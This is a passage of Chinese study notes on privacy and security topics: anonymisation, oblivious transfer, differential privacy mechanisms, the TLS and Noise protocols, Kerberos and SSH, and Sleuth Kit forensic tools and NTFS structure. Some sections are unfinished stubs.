<li>针对同一请求，如果客户端收到了 f+1 个相同的返回结果，那么它就把这个结点作为最终的结果。</li>
</ol>
<p>Multi Signature</p>
<p>Zyzzy</p>
<p>Trust Zone</p>
<p>Single Counter</p>
<h3 id="bft用在公链上"><a class="header" href="#bft用在公链上">BFT用在公链上</a></h3>
<p>联盟链的节点是固定的。公链的节点是</p>
<p>ZILLIQA</p>
<p>OmniLeger</p>
<p>Time Lock</p>
<p>Kick-off</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="差分隐私"><a class="header" href="#差分隐私">差分隐私</a></h1>
<ul>
<li>匿名化
<ul>
<li>k-Anonymity</li>
<li>I-Diversity</li>
<li>t-Closeness</li>
</ul>
</li>
<li>多方安全计算
<ul>
<li>混淆电路</li>
<li>密钥分享</li>
<li>不经意传输</li>
<li>同态加密</li>
</ul>
</li>
<li>可信执行环境
<ul>
<li>TEE(SGX)</li>
</ul>
</li>
<li>差分隐私
<ul>
<li>ramdom response</li>
</ul>
</li>
</ul>
<p><img src="Basic/Secure/Crypto/../images/image-20210615111332418.png" alt="image-20210615111332418" /></p>
<h2 id="匿名化"><a class="header" href="#匿名化">匿名化</a></h2>
<p>在很多场景下我们需要share data，比如为了进行研究、法律要求等等。但是公布数据可能会泄漏个人的隐私。</p>
<h3 id="k-anonymity"><a class="header" href="#k-anonymity">k-Anonymity</a></h3>
<p><img src="Basic/Secure/Crypto/../images/image-20210616200655036.png" alt="image-20210616200655036" /></p>
<p>我们把数据分成几类，有的是Quasi-identifiers(QIDs)，意思是可以从这些属性中推断出人的身份；有的是 Sensitive Attributes (SAs)，意思是敏感数据。</p>
<p>比如对于上面的QID，我们通过generalization把数据变成一样的3个一组，这样攻击者就distinguish了。</p>
<p>但是这样也有问题，比如上面的SA第四个如果是Heart Disease，那么我们分不清三个哪一个是目标我们也知道目标得了Heart Disease，这是由于数据<strong>lack diversity</strong>。或者如果攻击者有别的背景知识判断。</p>
<h3 id="l-diversity"><a class="header" href="#l-diversity">l-Diversity</a></h3>
<p>针对上面提到的Lack diversity，有改进的l-Diversity方案。</p>
<ol>
<li>Distinct l-diversity： 就是要求每一组至少有L种SAs。</li>
<li>Entropy l-diversity： 要求Entropy(qeui-class)&gt;= log2(l)。那么这个Entropy是个什么呢？是信息熵，<img src="Basic/Secure/Crypto/../images/80c1330c8154198d71e3bce59b67cebe.svg" alt="img" />。pi代表每个取值出现的概率，log一般以2为底。</li>
</ol>
<p>但是这对单值属性并不友好，比如只有是/否的属性。</p>
<h3 id="t-closeness"><a class="header" href="#t-closeness">t-Closeness</a></h3>
<h2 id="安全多方计算-2"><a class="header" href="#安全多方计算-2">安全多方计算</a></h2>
<h3 id="不经意传输"><a class="header" href="#不经意传输">不经意传输</a></h3>
<p>不经意传输。他是一个协议，可以实现以下目标</p>
<blockquote>
<p>Sender has n messages, and the receiver has an index i.
Receiver wishes to receive the i-th among the sender's messages, without the sender learning i.
Sender wants to ensure that the receiver receive only one of the n messages.</p>
</blockquote>
<p>以1-n 不经意传输，表明如何实现上面的目标</p>
<ol>
<li>Sender 拥有n个<code>(public key, private key)</code>，他拥有的message记做<code>M1~Mn</code>。</li>
<li>Receiver 产生一个随机数<code>R</code>，用<code>public key i</code>加密这个随机数<code>R</code>，然后将加密的结果<code>R'</code>发送给Sender。</li>
<li>Sender 用 <code>private key</code>解密<code>R'</code>，得到n个数字<code>K1~Kn</code>。由于他不知道i，所以他会得到一个有意义的结果和n-1个无意义的结果，当然对Sender来说他们都是随机数。Sender依次用<code>M xor K</code>，得到<code>E</code>，将<code>E</code>发送给Receiver。</li>
<li>Receiver用<code>Ei xor R</code>就可以知道获得真正的信息<code>Mi</code>了。如果他用R异或别的E，得到的将是没有意义的内容。</li>
</ol>
<p>至此，我们实现了上述的目标。</p>
<h3 id="同态加密"><a class="header" href="#同态加密">同态加密</a></h3>
<h2 id="差分隐私-1"><a class="header" href="#差分隐私-1">差分隐私</a></h2>
<p>提出者： Cynthia Dwork</p>
<h3 id="cdp"><a class="header" href="#cdp">CDP</a></h3>
<p><strong>差分隐私</strong>顾名思义就是用来防范<strong>差分攻击</strong>的。举个简单的例子，假设现在有一个婚恋数据库，2个单身8个已婚，只能查有多少人单身。刚开始的时候查询发现，2个人单身；现在张三跑去登记了自己婚姻状况，再一查，发现3个人单身。所以张三单身。而差分隐私需要做到的就是使得攻击者的知识不会因为这些新样本的出现而发生变化，或者说不让一个样本的加入与否对我们的输出结果产生重大差异。那怎么做到呢？加入<strong>随机噪声</strong>。</p>
<blockquote>
<p>我们引入随机函数A对数据集进行噪声引入，对于两个相邻（只相差一条记录）的数据集D和D‘。如果</p>
<p>$Pr[A(D)=t] \le e^\epsilon Pr[A(D')=t]$ 对任何A可能产生的t都成立</p>
<p>那么我们说A满足$\epsilon-Differential$。</p>
</blockquote>
<p>一般来说$\epsilon&lt;1$我们认为是比较好的噪声。</p>
<p>Trust modle: 有一个可信的第三方(server)，由中心加噪声。</p>
<h4 id="laplace-noise"><a class="header" href="#laplace-noise">Laplace noise</a></h4>
<p>拉普拉斯分布：$p(x)=\frac{1}{2\lambda}e^{-\frac{|x-\mu|}{\lambda}}$。一般取μ=0，函数形式如：$p(x)=\frac{1}{2\lambda}e^{-\frac{|x|}{\lambda}}$。</p>
<p>标准Laplace分布的均值为0，方差为$2\lambda^2$，几种$\lambda$下其概率分布图如下：</p>
<p><img src="Basic/Secure/Crypto/../images/b3fb78e7f1cebd25b1570275d160f138.png" alt="在这里插入图片描述" /></p>
<p>我们常用的噪声就是拉普拉斯。怎么加噪声呢？</p>
<p>先定义<strong>局部敏感性</strong></p>
<blockquote>
<p>对于一个查询函数 f，它的形式为 f:D-&gt;R ，其中 D 为一数据集， R 是查询函数的返回结果。在一给定的数据集 D 和与它相邻的任意数据集 D' 上，它的局部敏感性定义为： $ S(f)=max_{D'}|f(D)-f(D')|$  。</p>
</blockquote>
<p>比如，如果count函数$f(D)=|D|$，那么$S(f) = 1$。</p>
<p>比如，如果sum函数$f(D) = \Sigma d_i,d_i\in[0,A]$，那么$S(f) = A$。</p>
<p>然后加入噪声！$M(X) = f(X) + (Lap(S(f)/\epsilon))^d$</p>
<h4 id="gauss-noise"><a class="header" href="#gauss-noise">Gauss noise</a></h4>
<p>正态分布：$\mu$是期望，$\sigma$是标准差。<img src="Basic/Secure/Crypto/../images/d8fc1a3696534a47f23d6bcb60c1212c.svg" alt="img" /></p>
<p>标准正态分布：<img src="Basic/Secure/Crypto/../images/a49f2d97f625020c180a64346e8cece7.svg" alt="img" /></p>
<p>分布图：</p>
<p><img src="Basic/Secure/Crypto/../images/static.leiphone.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg" alt="img" /></p>
<h3 id="ldp"><a class="header" href="#ldp">LDP</a></h3>
<p>LDP用于收集数据，CDP用于发布数据。</p>
<p>类似的，一个随机化算法A满足$\epsilon-Local\ Differential$的意思是，如果对于任何两个输入x和x'，任何的输出y都满足$Pr[A(x)=y] \le e^\epsilon Pr[A(x')=y]$ 。</p>
<p>为什么我们有了CDP还需要LDP呢？因为LDP不需要一个可信的第三方，在本地做完噪声加入之后把数据发送给不可信的第三方。</p>
<p>三个步骤：</p>
<ol>
<li><strong>Encoding</strong> : 本地如何给数据编码 </li>
<li><strong>Perturbation</strong> : 本地如何给编码加噪声 </li>
<li><strong>Aggregation</strong> : 中心如何利用加了噪声的数据得到有效的统计值</li>
</ol>
<h4 id="random-response"><a class="header" href="#random-response">Random response</a></h4>
<p><a href="https://zh.wikipedia.org/wiki/%E9%9A%A8%E6%A9%9F%E5%8C%96%E5%9B%9E%E7%AD%94">wikipedia</a></p>
<p>假设一个二值问题，你需要回答0/1。问一个问题，有p的概率用户回答真实答案，1-p的概率用户回答虚假答案。p应该在0到1之间。我发现这个和老师PPT上给的不一样。老师给的是有p的概率用户回答真实答案，1-p的概率用户回答随机答案。不过这问题都不大，只是表述上有差异。</p>
<p>那么，用户回答答案是1的概率（$P_1$表示真的是1）应该是$P = p*P_1+(1-p)(1-P_1)$。移项得到$P_1 = \frac{P+p-1}{2p-1}$。</p>
<p>在Warner的设计中，受访者无论抽到任何一个选项，都需要回答感敏问题；为更有效减低受访者的焦虑，Greenberg在1969年提出了一种现在更常用的随机化回答方法<a href="https://zh.wikipedia.org/wiki/%E9%9A%A8%E6%A9%9F%E5%8C%96%E5%9B%9E%E7%AD%94#endnote_fn_2">2</a>。在这种方法下，访问员向受访者提供两条问题，一条是敏感问题，另一条是非敏感问题；受访者在访问员不知情下通过抽签方法以决定需要回答哪一条问题，由此保障隐私。</p>
<p>现在我们来评价Random response。</p>
<h4 id="bloom-filter"><a class="header" href="#bloom-filter">Bloom filter</a></h4>
<p><a href="https://llimllib.github.io/bloomfilter-tutorial/zh_CN/">Bloom filter</a>是一个数据结构，它可以用来判断某个元素是否在集合内，具有运行快速，内存占用小的特点。而高效插入和查询的代价就是，Bloom Filter 是一个<strong>基于概率的数据结构</strong>：它只能告诉我们一个元素<strong>绝对不</strong>在集合内或<strong>可能</strong>在集合内。</p>
<p>只需要简单的对输入进行多次哈希操作，并把对应于其结果的比特置为1，就可以向 Bloom filter 添加一个元素。上面这个链接给的例子很直观。</p>
<h4 id="unary-encoding-basic-rappor"><a class="header" href="#unary-encoding-basic-rappor">Unary encoding (Basic rappor)</a></h4>
<p>$p=\frac {e^{\epsilon/2}} {e^{\epsilon/2}+1}$ ,是每个Bit不翻转的概率；q = $\frac {1}{e^{\epsilon/2}+1}$，是每个Bit翻转的概率。</p>
<p>证明也很简单，<img src="Basic/Secure/Crypto/../images/image-20210617205126777.png" alt="image-20210617205126777" />。</p>
<p>对用户的数据先进行编码，再加入噪声。假设数据的范围是<code>[1..d]</code>编码方式如下：</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210608101407088.png" alt="image-20210608101407088" /></p>
<p>评价需要利用<strong>方差</strong>来知道我们估y计的<strong>有效性</strong>。$Var(c_v) = Var(\frac {I_v-nq} {p-q}) = \frac {Var(I_v)} {(p-q)^2} = \frac {npq} {(p-q)^2} = \frac {ne^{\epsilon/2}}{e^{\epsilon}-2e^{\epsilon/2}+1}$.</p>
<h4 id="optimized-unary-encoding"><a class="header" href="#optimized-unary-encoding">Optimized Unary Encoding</a></h4>
<p>UE的一个问题是，当d很大的时候，就会有很多很多的0和一个1。然后很多的0翻转成1会带来大噪声。（可能需要计算方差）</p>
<p>Perturb 0 and 1 differently and should reduce 𝑝 0→1 as much as possible</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210619230628863.png" alt="image-20210619230628863" /></p>
<p>现在我们来看Optimized UE好在哪里。还是通过计算方差来评价，下面这个图是从论文里截过来的，符号和上面对照一下，$nf_i$就是$n_v$，那个$(\Sigma ...(i))$就是$I_v$。这里的$p=1/2,q = 1/(e^\epsilon+1)$. 论文说一般我们把后面的fi舍掉如果fi不大的话，然后就可以和上面的做比较了，算出来这个Optimized UE的方差是小于UE的方差的（把p,q用$\epsilon$换掉，因为比的应该是相同$\epsilon$下的数据有效性）。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210620102559710.png" alt="image-20210620102559710" /></p>
<h4 id="generalized-random-response"><a class="header" href="#generalized-random-response">Generalized Random response</a></h4>
<p>Random response只适用</p>
<ul>
<li>User：
<ul>
<li>Encode $x=v$ {suppose v from $D=[1,2,...,d]$}</li>
<li>Toss a coin with bias $p$</li>
<li>If it is head (with probability p), report the true value $y=x$</li>
<li>Otherwise, report any other value with probability $q=\frac {1-p} {d-1}$ (uniformly at random)</li>
<li>然后根据让$p=\frac {e^\epsilon} {e^\epsilon+d-1},q = \frac {1} {e^\epsilon+d-1}$，然后我们不难推导出这样的p和q满足$\epsilon$-dp。</li>
</ul>
</li>
<li>Aggregator
<ul>
<li>Suppose $n_v$ users possess value $v$, $I_v$ is the number of reports on $v$.</li>
<li>那么我们对$I_v$的期望 $E[I_v] = n_v p+(n-n_v) q$</li>
<li>根据上面的期望，我们估计真正有值$v$的人应该有$c(v) = \frac {I_v-nq}{p-q}$. 这是<strong>无偏估计</strong>。</li>
</ul>
</li>
</ul>
<h2 id="privacy-preserving-data-analysis"><a class="header" href="#privacy-preserving-data-analysis">Privacy-preserving Data Analysis</a></h2>
<ol>
<li>Privacy preservation：什么是隐私，怎么保护隐私</li>
<li>Computational correctness：</li>
<li>Computational efficiency：不能用过多的算力</li>
</ol>
<h3 id="heavy-hitter-estimation"><a class="header" href="#heavy-hitter-estimation">Heavy Hitter Estimation</a></h3>
<p>例子：通过隐私保护的方式，来找到被设置为主页最多的20个网站。</p>
<p>挑战：其实网站的数量是不计其数的，不过常用的没有那么多。</p>
<p>Item sampling 希望利用抽样方式，从原数据集中抽取适量的样本，以便将样本直接放入内存中，接着再对样本进行频繁项集挖掘，以此减少挖掘时间。</p>
<p>item packing </p>
<p>bit sampling</p>
<p>2 phase framework：</p>
<ol>
<li>找出可能的heavy hitter: bitwise randomization</li>
<li>bitwise randomization+item sampling</li>
</ol>
<h3 id="社交网络"><a class="header" href="#社交网络">社交网络</a></h3>
<p>neighbor lists: 一个用户follow了哪些别的用户，可能很多但是相对于总数还是少的。</p>
<h2 id="可信执行环境"><a class="header" href="#可信执行环境">可信执行环境</a></h2>
<h3 id="sgx"><a class="header" href="#sgx">SGX</a></h3>
<h2 id="homomorphic-encryption"><a class="header" href="#homomorphic-encryption">Homomorphic Encryption</a></h2>
<p>同态加密。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="密码学基础-2"><a class="header" href="#密码学基础-2">密码学基础</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="密码学协议"><a class="header" href="#密码学协议">密码学协议</a></h1>
<p>在学校的密码学课程中，往往设计了具体的加密解密算法，事实上光有一个优秀的加密解密算法只可以解决下面提到的机密性问题，但是要实现完整性和可用性，离不开一个设计良好的密码学协议。下面所说的“安全”，大部分指的就是<strong>前三点(CIA)</strong>。</p>
<ul>
<li>机密性Confidentiality：信息在使用和传输的过程中以密文保存，只有授权的用户才可以获取到明文。（我们会对传输的数据进行加密，对称加密或者非对称加密）</li>
<li>完整性Integrity：信息在使用和传输的过程中，不会被非法授权和破坏。（我们会使用哈希算法，数字签名来保证数据的一致性）</li>
<li>可用性Availability：合法用户对信息的访问不会被拒绝。</li>
<li>身份验证Authentication：确保交换信息的各方是他们所声称的身份。</li>
<li>不可否认性Nonrepudiation：</li>
</ul>
<p>在这里我们会介绍主流的密码学协议，感受设计密码学协议应该考虑的因素以及做法。</p>
<h2 id="ssltls"><a class="header" href="#ssltls">SSL/TLS</a></h2>
<h3 id="历史"><a class="header" href="#历史">历史</a></h3>
<blockquote>
<p>1994年，NetScape公司设计了SSL协议（Secure Sockets Layer）的1.0版，但是未发布。</p>
<p>1995年，NetScape公司发布SSL 2.0版，很快发现有严重漏洞。</p>
<p>1996年，SSL 3.0版问世，得到大规模应用。</p>
<p>1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版<a href="https://en.wikipedia.org/wiki/Secure_Sockets_Layer">TLS</a> 1.0版。</p>
<p>2006年，推出TLS 1.1版。</p>
<p>2008年，推出TLS 1.2版。</p>
<p>2018年，推出TLS 1.3版。</p>
</blockquote>
<h3 id="基本思路"><a class="header" href="#基本思路">基本思路</a></h3>
<p>TLS采用的是公钥加密体制，不过由于公钥加密非常慢，所以事实上公钥只是用于加密双方公用的对称密钥，而用对称密钥来加密通信的真正内容。<strong>基本</strong>过程如下：</p>
<ol>
<li>Client向Server请求并验证公钥。</li>
<li>双方协商生成对称密钥。</li>
<li>双方使用对称密钥进行加密通信。</li>
</ol>
<h3 id="使用场景"><a class="header" href="#使用场景">使用场景</a></h3>
<p>SSL/TLS允许在不安全的网络中进行安全的通信。在目前所有流行的应用层解决方案中，都离不开 TLS。譬如HTTPS中的“S(ecure)”，就是SSL/TLS。</p>
<h2 id="noise"><a class="header" href="#noise">NOISE</a></h2>
<p>Noise Protocol Framework（简称 Noise）是一个用于构建安全协议的框架。与 TLS，IPSec 这样的有完整实现的协议不同，Noise 更多像是一个蓝图，它为那些想创建自己的安全协议的开发者提供了一套模板。就好像元编程之于编程，Noise 是协议的元协议（meta-protocol）。</p>
<h3 id="使用场景-1"><a class="header" href="#使用场景-1">使用场景</a></h3>
<p>适合非中心化的P2P网络。</p>
<h3 id="思路"><a class="header" href="#思路">思路</a></h3>
<blockquote>
<p>A Noise protocol begins with two parties exchanging <strong>handshake messages</strong>. During this <strong>handshake phase</strong> the parties exchange DH public keys and perform a sequence of DH operations, hashing the DH results into a shared secret key. After the handshake phase each party can use this shared key to send encrypted <strong>transport messages</strong>.</p>
<p>The Noise framework supports handshakes where each party has a long-term <strong>static key pair</strong> and/or an <strong>ephemeral(临时的) key pair</strong>. A Noise handshake is described by a simple language. This language consists of <strong>tokens</strong> which are arranged into <strong>message patterns</strong>. Message patterns are arranged into <strong>handshake patterns</strong>.®</p>
<p>A <strong>message pattern</strong> is a sequence of tokens that specifies the DH public keys that comprise a handshake message, and the DH operations that are performed when sending or receiving that message. A <strong>handshake pattern</strong> specifies the sequential exchange of messages that comprise a handshake.</p>
<p>A handshake pattern can be instantiated by <strong>DH functions</strong>, <strong>cipher functions</strong>, and <strong>hash functions</strong> to give a concrete <strong>Noise protocol</strong>.</p>
<p>The core of Noise is a set of variables maintained by each party during a handshake, and rules for sending and receiving handshake messages by sequentially processing the tokens from a message pattern.</p>
<p>Each party maintains the following variables:</p>
<ul>
<li><strong><code>s, e</code></strong>: The local party's static and ephemeral key pairs (which may be empty).</li>
<li><strong><code>rs, re</code></strong>: The remote party's static and ephemeral public keys (which may be empty). <code>rs</code>远程的</li>
<li><strong><code>h</code></strong>: A <strong>handshake hash</strong> value that hashes all the handshake data that's been sent and received.</li>
<li><strong><code>ck</code></strong>: A <strong>chaining key</strong> that hashes all previous DH outputs. Once the handshake completes, the chaining key will be used to derive the encryption keys for transport messages.</li>
<li><strong><code>k, n</code></strong>: An encryption key <code>k</code> (which may be empty) and a counter-based nonce <code>n</code>. Whenever a new DH output causes a new <code>ck</code> to be calculated, a new <code>k</code> is also calculated. The key <code>k</code> and nonce <code>n</code> are used to encrypt static public keys and handshake payloads. Encryption with <code>k</code> uses some <strong>AEAD</strong> cipher mode (in the sense of Rogaway [<a href="http://www.noiseprotocol.org/noise.html#ref-Rogaway:2002">1</a>]) and uses the current <code>h</code> value as <strong>associated data</strong> which is covered by the AEAD authentication. Encryption of static public keys and payloads provides some confidentiality and key confirmation during the handshake phase.</li>
</ul>
<p>A handshake message consists of some DH public keys followed by a <strong>payload</strong>. The payload may contain certificates or other data chosen by the application. To send a handshake message, the sender specifies the payload and sequentially processes each token from a message pattern. The possible tokens are:</p>
<ul>
<li><strong><code>&quot;e&quot;</code></strong>: The sender generates a new ephemeral key pair and stores it in the <code>e</code> variable, writes the ephemeral public key as cleartext into the message buffer, and hashes the public key along with the old <code>h</code> to derive a new <code>h</code>.</li>
<li><strong><code>&quot;s&quot;</code></strong>: The sender writes its static public key from the <code>s</code> variable into the message buffer, encrypting it if <code>k</code> is non-empty, and hashes the output along with the old <code>h</code> to derive a new <code>h</code>.</li>
<li><strong><code>&quot;ee&quot;, &quot;se&quot;, &quot;es&quot;, &quot;ss&quot;</code></strong>: A DH is performed between the initiator's key pair (whether static or ephemeral is determined by the first letter) and the responder's key pair (whether static or ephemeral is determined by the second letter). The result is hashed along with the old <code>ck</code> to derive a new <code>ck</code> and <code>k</code>, and <code>n</code> is set to zero.</li>
</ul>
<p>After processing the final token in a handshake message, the sender then writes the payload into the message buffer, encrypting it if <code>k</code> is non-empty, and hashes the output along with the old <code>h</code> to derive a new <code>h</code>.</p>
<p>As a simple example, an unauthenticated DH handshake is described by the handshake pattern:</p>
<pre><code>  -&gt; e
  &lt;- e, ee
</code></pre>
<p>The <strong>initiator</strong> sends the first message, which is simply an ephemeral public key. The <strong>responder</strong> sends back its own ephemeral public key. Then a DH is performed and the output is hashed into a shared secret key.</p>
<p>Note that a <strong>cleartext payload is sent in the first message</strong>, after the cleartext ephemeral public key, and an encrypted payload is sent in the response message, after the cleartext ephemeral public key. The application may send whatever payloads it wants.</p>
<p>The responder can send its static public key (under encryption) and authenticate itself via a slightly different pattern:</p>
<pre><code>  -&gt; e
  &lt;- e, ee, s, es
</code></pre>
<p>In this case, the final <code>ck</code> and <code>k</code> values are a hash of both DH results. Since the <code>es</code> token indicates a DH between the initiator's ephemeral key and the responder's static key, successful decryption by the initiator of the second message's payload serves to authenticate the responder to the initiator.</p>
<p>Note that the second message's payload may contain a zero-length plaintext, but the payload ciphertext will still contain authentication data (such as an authentication tag or &quot;synthetic IV&quot;), since encryption is with an AEAD mode. The second message's payload can also be used to deliver certificates for the responder's static public key.</p>
<p>The initiator can send <em>its</em> static public key (under encryption), and authenticate itself, using a handshake pattern with one additional message:</p>
<pre><code>  -&gt; e
  &lt;- e, ee, s, es
  -&gt; s, se
</code></pre>
<p>The following sections flesh out the details, and add some complications. However, <strong>the core of Noise is this simple system of variables, tokens, and processing rules, which allow concise expression of a range of protocols.</strong><sup class="footnote-reference"><a href="#2">1</a></sup></p>
</blockquote>
<p>部分翻译</p>
<div class="table-wrapper"><table><thead><tr><th>变量名</th><th>含义</th></tr></thead><tbody>
<tr><td><code>s</code></td><td>本地的公钥私钥对</td></tr>
<tr><td><code>e</code></td><td>本地的临时公钥私钥对（可能为空）</td></tr>
<tr><td><code>rs</code></td><td>远程的公钥私钥对</td></tr>
<tr><td><code>re</code></td><td>远程对临时公钥私钥对</td></tr>
<tr><td><code>h</code></td><td>握手哈希，每次握手数据的发送和接受都会带上握手哈希</td></tr>
<tr><td><code>ck</code></td><td>哈希之前所有的Deffie hellman结果。当握手结束后将会用于生成加密的密钥</td></tr>
<tr><td><code>k</code></td><td>加密密钥</td></tr>
<tr><td><code>n</code></td><td>基于计数的噪声。<code>k,n</code>,<code>h</code>分别作为密钥和认证消息用于<strong>AEAD加密</strong><sup class="footnote-reference"><a href="#3">2</a></sup> 公钥和握手消息。</td></tr>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>Payload token</th><th>含义</th></tr></thead><tbody>
<tr><td>e</td><td>发送方产生的临时公钥（保存在变量<code>e</code>中）</td></tr>
<tr><td>s</td><td>发送方的公钥（保存在变量<code>s</code>中）</td></tr>
<tr><td>ee, se, es, ss</td><td>通过Diffie Hellman Key Exchange（左initiator, 右responder）得到的公钥，会和之前的<code>ck</code>一起生存<code>ck</code>和<code>k</code></td></tr>
</tbody></table>
</div>
<p>举例，最简单的Diffie Hellman Key Exchange的过程描述为<sup class="footnote-reference"><a href="#4">3</a></sup></p>
<pre><code> -&gt; e
 &lt;- e, ee
</code></pre>
<h2 id="kerberos"><a class="header" href="#kerberos">Kerberos</a></h2>
<p>应用：用于在不安全的信道进行<strong>节点之间</strong>的<strong>身份认证authentication</strong>。他并不是一个用于加密信道的协议，所以可能会和SSL/TLS同时使用。</p>
<h2 id="ipsec"><a class="header" href="#ipsec">IPSec</a></h2>
<h2 id="ssh"><a class="header" href="#ssh">SSH</a></h2>
<p>SSH和SSL并没有什么直接的关系。</p>
<div class="table-wrapper"><table><thead><tr><th><strong>SSH</strong></th><th><strong>SSL</strong></th></tr></thead><tbody>
<tr><td>Used for securely and remotely connecting to another machine to issue commands.</td><td>Used for securely transmitting data between two parties – normally a visitor to your website and your website’s server.</td></tr>
<tr><td>Based on network tunnels.</td><td>Based on digital certificates (i.e. SSL certificate)</td></tr>
<tr><td>Runs on port 22</td><td>Runs on port 443</td></tr>
<tr><td>Requires the client to authenticate with a username/password or cryptographic key</td><td>Only requires authentication on the server side (the client isn’t required to authenticate)</td></tr>
<tr><td>Is a cryptographic network protocol</td><td>Is a security protocol</td></tr>
</tbody></table>
</div>
<hr />
<div class="footnote-definition" id="2"><sup class="footnote-definition-label">1</sup>
<p><a href="http://www.noiseprotocol.org/noise.html#introduction">noise protocol document</a>
<sup class="footnote-reference"><a href="#3">2</a></sup>: <a href="https://en.wikipedia.org/wiki/Authenticated_encryption"><strong>Authenticated Encryption</strong> (<strong>AE</strong>) and <strong>Authenticated Encryption with Associated Data</strong> (<strong>AEAD</strong>) are forms of encryption which simultaneously assure the confidentiality and authenticity of data.</a></p>
</div>
<p><img src="Basic/Secure//Users/bytedance/Documents/note/images/%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" alt="流程图" /></p>
<div class="footnote-definition" id="3"><sup class="footnote-definition-label">2</sup>
<p><a href="https://byronhe.com/post/2015/09/06/tls-protocol-analysis-and-crypto-protocol-design/">TLS协议分析 与 现代加密通信协议设计</a>
<sup class="footnote-reference"><a href="#4">3</a></sup>: <a href="https://noiseexplorer.com/patterns/NN/">Noise NN Pattern</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h1 id="电子取证"><a class="header" href="#电子取证">电子取证</a></h1>
<p>两个概念：</p>
<ul>
<li><strong>Digital forensics</strong> is a branch of forensic science pertaining to legal evidence found <strong>in computers and digital storage mediums</strong>. It use of science or technology in the investigation and establishment of facts or evidence in a court of law</li>
<li><strong>Digital investigation</strong> is a process where we develop and test hypotheses that answer questions about digital events. Digital evidence is a digital object that contains reliable information that supports or refutes a hypothesis</li>
</ul>
<p>有一些为电子取证开发的工具，比如商业软件Encase、FTK，还有开源软件<strong>TSK</strong>、<strong>Autopsy</strong>。这些开源软件在Kali Linux上都预装了。</p>
<p>TSK（The Sleuth Kit）是一款基于命令行的数字取证工具集，用于分析磁盘镜像。</p>
<div class="table-wrapper"><table><thead><tr><th>工具类别</th><th>工具名称</th><th>具体描述</th></tr></thead><tbody>
<tr><td>文件系统层</td><td>fsstat</td><td>显示和文件系统相关的所有详细信息</td></tr>
<tr><td>文件名层</td><td>ffind</td><td>用于查找指向特定元数据结构的未分配空间和已分配空间的文件名</td></tr>
<tr><td></td><td>fls</td><td>列出目录中的文件名</td></tr>
<tr><td>元数据层</td><td>icat</td><td>用于从文件中提取数据单元</td></tr>
<tr><td></td><td>ifind</td><td>用于查找指定文件名（或其他元数据结构）指向的元数据结构</td></tr>
<tr><td></td><td>ils</td><td>用于列出元数据结构及其内容</td></tr>
<tr><td></td><td>istat</td><td>用于显示统计信息，尤其是有关元数据结构的统计信息</td></tr>
<tr><td>数据单元层</td><td>blkcat</td><td>用于提取并显示指定数据单元的内容</td></tr>
<tr><td></td><td>blkls</td><td>用于列出有关数据单元的详细信息</td></tr>
<tr><td></td><td>blkstat</td><td>用于显示指定数据结构的统计信息</td></tr>
<tr><td></td><td>blkcalc</td><td>用于计算原始镜像中未分配的空间的数据</td></tr>
<tr><td>文件系统日志层</td><td>jcat</td><td>用于显示日志块的信息</td></tr>
<tr><td></td><td>jls</td><td>用于列出文件系统日志的表项</td></tr>
<tr><td>卷系统层</td><td>mmls</td><td>用于显示磁盘布局和组织结构</td></tr>
<tr><td></td><td>mmstat</td><td>用于显示卷系统的信息</td></tr>
<tr><td></td><td>mmcat</td><td>用于提取分区的内容</td></tr>
<tr><td>镜像文件层</td><td>img_stat</td><td>用于显示镜像文件的详细信息，收集分段镜像文件的大小和字节范围</td></tr>
<tr><td></td><td>img_cat</td><td>用于输出镜像文件的内容，显示镜像文件的原始内容</td></tr>
<tr><td>磁盘工具层</td><td>disk_sreset</td><td>用于删除镜像中的HPA区域</td></tr>
<tr><td></td><td>disk_stat</td><td>用于显示镜像中是否存在HPA区域</td></tr>
<tr><td>自动化工具</td><td>tsk_comparedir</td><td>用于比较本地目录与镜像或原始设备中的数据。可以用于检测是否rootkit在本地目录层下隐藏了文件</td></tr>
<tr><td></td><td>tsk_gettimes</td><td>用于提取创建时间线分析所需的MAC时间的元数据</td></tr>
<tr><td></td><td>tsk_loaddb</td><td>用于将卷、镜像和文件元数据等保存到SQLite数据库中，可用非TSK工具对数据库进行分析</td></tr>
<tr><td></td><td>tsk_recover</td><td>用于从镜像中提取未分配空间和已分配空间的文件</td></tr>
<tr><td>其他工具</td><td>hfind</td><td>用于i使用二进制排序算法，计算哈希并进行哈希数据库比对，哈希工具为md5sum</td></tr>
<tr><td></td><td>mactime</td><td>为一个文件的活动创建时间线</td></tr>
<tr><td></td><td>sorter</td><td>根据文件类型对文件进行排序、执行扩展名检查、哈希库查询</td></tr>
<tr><td></td><td>sigfind</td><td>用于查找指定数据集中的二进制文件签名</td></tr>
</tbody></table>
</div>
<p>Autopsy是一个TSK等电子数据取证工具的图形界面平台。</p>
<h2 id="数据逆向工程"><a class="header" href="#数据逆向工程">数据逆向工程</a></h2>
<p>数据逆向工程(Data reverse engineering) deals with the problem of</p>
<ul>
<li>What information is stored in a computer system</li>
<li>How this information can be extracted and used</li>
</ul>
<p>一般来说，逆向工程可以通过静态调试和动态调试的方式完成。</p>
<h2 id="ntfs"><a class="header" href="#ntfs">NTFS</a></h2>
<p>NTFS通过<strong>B树</strong>来组织目录项。用NTFS Log记录详细的事务日志。</p>
<img src="Basic/Secure/Forensics/../images/image-20220306190631709.png" alt="image-20220306190631709" style="zoom:50%;" />
<p>Partition Boot Sector(虽然叫做Sector，但是他的大小可能不只一个Sector):  gives the starting location of the MFT (Master File Table), cluster size (1 to 128 sectors, but commonly 8), size of each MFT entry (usually 1024 bytes)</p>
<p>Master File Table: is basically a <strong>relational database table</strong> in which information (attributes) for each file or directory is represented by a record (entry) in the MFT</p>
<p>现在我们来看MFT Entry的结构。</p>
<div class="table-wrapper"><table><thead><tr><th>Byte Range</th><th>Description</th><th>Essential</th></tr></thead><tbody>
<tr><td>0-3</td><td>MFT标识&quot;FILE&quot;<br />有时会发现&quot;BAAD&quot;标识error</td><td></td></tr>
<tr><td>4-5</td><td>Offset to fixup array(更新序列号)</td><td></td></tr>
